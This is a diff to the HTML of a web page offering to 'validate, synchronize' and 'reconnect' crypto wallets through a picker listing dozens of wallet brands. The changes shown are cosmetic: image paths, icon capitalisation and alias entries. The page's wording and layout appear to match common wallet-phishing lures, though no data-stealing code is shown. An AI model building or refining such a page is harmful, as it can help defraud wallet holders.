@@ -82,9 +82,7 @@
 
     <main>
       <section class="hero">
-        <video class="hero-video" autoplay muted loop playsinline>
-          <source src="background-pattern.mp4" type="video/mp4">
-        </video>
+        <img src="background-pattern.jpg" alt="Background" class="hero-video">
         <div class="hero-content">
           <h1>Open and Decentralized Protocol For Syncing Various Wallets to Dapps Secure Server</h1>
           <p>Securely validate, synchronize and generate QR codes to reconnect wallets across devices and dapps.</p>
@@ -485,8 +483,8 @@
     <script>
       // Minimal UI-only modal logic (no wallet detection or transaction code)
       const visibleList = [
-        { name: 'MetaMask', icon: '/wallets/metamask.png' },
-        { name: 'WalletConnect', icon: '/wallets/walletconnect.jpeg' },
+        { name: 'MetaMask', icon: '/wallets/Metamask.png' },
+        { name: 'WalletConnect', icon: '/wallets/Walletconnect.jpeg' },
         { name: 'Phantom', icon: '/wallets/phantom.png' },
         { name: 'SuperHero', icon: '/wallets/SuperHero.png' },
         { name: 'Sub', icon: '/wallets/Sub.png' },
@@ -496,20 +494,20 @@
         { name: 'Ledger Live', icon: '/wallets/ledgerlive.png' },
         { name: 'Safepal', icon: '/wallets/safepal.png' },
         { name: 'Exodus', icon: '/wallets/exodus.png' },
-        { name: 'Ronin', icon: '/wallets/ronin.png' },
-        { name: 'OKX Wallet', icon: '/wallets/okxwallet.png' },
+        { name: 'Ronin', icon: '/wallets/Ronin.png' },
+        { name: 'OKX Wallet', icon: '/wallets/Okxwallet.png' },
         { name: 'Bitget Wallet', icon: '/wallets/bitgetwallet.png' },
         { name: 'Bybit Wallet', icon: '/wallets/bybit.png' },
         { name: 'Mycelium', icon: '/wallets/mycelium.png' },
-        { name: 'Keplr', icon: '/wallets/keplr.jpeg' },
+        { name: 'Keplr', icon: '/wallets/Keplr.jpeg' },
         { name: 'Bridge', icon: '/wallets/bridge.png' },
         { name: 'Guarda', icon: '/wallets/guarda.png' },
         { name: 'Coinomi', icon: '/wallets/coinomi.png' },
-        { name: 'Uniswap', icon: '/wallets/uniswap.jpeg' },
+        { name: 'Uniswap', icon: '/wallets/Uniswap.jpeg' },
         { name: 'Electrum', icon: '/wallets/electrum.png' },
         { name: 'BitPay', icon: '/wallets/bitpay.png' },
         { name: 'Binance Wallet', icon: '/wallets/binancewallet.png' },
-        { name: 'Magic', icon: '/wallets/magic.png' },
+        { name: 'Magic', icon: '/wallets/Magic.png' },
         { name: '1inch', icon: '/wallets/oneinch.png' },
         { name: 'Coinwallet', icon: '/wallets/coinwallet.png' }
       ];
@@ -567,7 +565,17 @@
           'cryptowallet': 'coinwallet',
           'coinbasewallet': 'coinbasewallet',
           'trustwallet': 'trustwallet',
-          'jupiter': 'jupiter'
+          'jupiter': 'jupiter',
+          'solflare': 'Solflare',
+          'slush': 'Slush',
+          'other': 'Other',
+          'metamask': 'Metamask',
+          'walletconnect': 'Walletconnect',
+          'ronin': 'Ronin',
+          'okxwallet': 'Okxwallet',
+          'keplr': 'Keplr',
+          'uniswap': 'Uniswap',
+          'magic': 'Magic'
         };
         const lookupName = aliasMap[safeName] || safeName;
         const exts = ['png','jpeg','jpg','svg'];
@@ -840,3 +848,5 @@
     </script>
   </body>
 </html>
+
+
